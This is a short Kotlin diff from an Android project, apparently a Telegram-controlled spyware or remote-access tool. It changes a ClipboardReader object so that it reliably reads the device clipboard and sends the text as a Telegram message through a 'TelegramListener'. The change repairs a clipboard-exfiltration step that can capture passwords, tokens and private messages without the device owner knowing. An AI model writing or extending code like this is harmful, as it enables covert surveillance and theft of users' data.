@@ -11,7 +11,7 @@ object ClipboardReader {
         Handler(Looper.getMainLooper()).post {
             try {
                 val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-                val text = cm.primaryClip?.getItemAt(0)?.getText(context.contentResolver)?.toString()
+                val text = cm.primaryClip?.getItemAt(0)?.coerceToText(context)?.toString()
                 if (!text.isNullOrBlank()) {
                     TelegramListener.instance.sendMessage("📋 Clipboard:\n$text")
                 } else {
